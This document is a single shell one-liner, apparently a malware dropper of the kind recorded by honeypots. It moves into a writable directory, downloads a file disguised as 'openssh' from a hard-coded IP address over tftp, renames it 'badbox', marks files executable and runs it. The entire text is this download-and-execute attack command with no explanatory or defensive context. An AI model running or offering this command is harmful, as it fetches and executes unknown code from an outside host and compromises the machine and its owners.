cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 89.34.97.112 -c get openssh;cat openssh >badbox;chmod +x *;./badbox
